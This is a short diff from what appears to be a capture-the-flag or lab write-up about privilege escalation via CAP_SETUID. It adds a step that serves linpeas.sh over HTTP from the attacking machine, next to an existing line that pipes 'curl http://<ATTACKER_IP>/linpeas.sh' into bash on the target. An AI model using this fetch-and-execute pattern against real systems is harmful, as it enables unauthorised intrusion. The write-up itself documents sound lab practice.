@@ -74,6 +74,10 @@ ssh utente@10.10.10.56
 #### **5. Privilege Escalation (CAP_SETUID)**
 **Vulnerability Identification**:  
 ```bash
+# Creating an HTTP server that serves the contents of the current directory on
+# the attacking machine where I downloaded linpeas.sh
+python -m http.server 80
+
 # Run linPEAS
 curl http://<ATTACKER_IP>/linpeas.sh | bash
 ```
